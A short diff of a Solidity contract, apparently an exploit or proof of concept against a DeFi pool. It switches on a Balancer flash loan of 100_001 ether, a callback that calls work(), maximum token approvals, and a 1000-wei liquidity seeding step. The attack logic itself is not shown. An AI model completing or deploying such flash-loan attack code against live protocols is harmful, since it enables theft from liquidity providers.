@@ -41,7 +41,7 @@ contract USDCLUSD {
         uint256[] memory feeAmounts,
         bytes memory
     ) external {
-        // work(); 
+        work(); 
         
         for (uint256 i; i < tokens.length; ) {
             IERC20 token = tokens[i];
@@ -63,11 +63,11 @@ contract USDCLUSD {
     }
 
     function flashLoanPrimary() external {
-        // IERC20[] memory tokens = new IERC20[](1);
-        // uint256[] memory amounts = new uint256[](1);
+        IERC20[] memory tokens = new IERC20[](1);
+        uint256[] memory amounts = new uint256[](1);
 
-        // tokens[0] = token1;
-        // amounts[0] = 100_001 ether;
+        tokens[0] = token1;
+        amounts[0] = 100_001 ether;
         
         token1.approve(address(manager), type(uint256).max);
         token0.approve(address(manager), type(uint256).max);
@@ -76,20 +76,20 @@ contract USDCLUSD {
 
         addLiquidity1000weiOfToken0(deadline);
     
-        //how many jumps of work you need
-        // uint interactions = 1;
-        // for(uint i; i < interactions; ){
-        //     IBalancerVault(vault).flashLoan(
-        //         IFlashLoanRecipient(address(this)),
-        //         tokens,
-        //         amounts,
-        //         ""
-        //     );
+        // how many jumps of work you need
+        uint interactions = 1;
+        for(uint i; i < interactions; ){
+            IBalancerVault(vault).flashLoan(
+                IFlashLoanRecipient(address(this)),
+                tokens,
+                amounts,
+                ""
+            );
 
-        //     unchecked {
-        //         ++i;
-        //     }
-        // } 
+            unchecked {
+                ++i;
+            }
+        } 
     }
 
     function flashLoanSecondary() external {
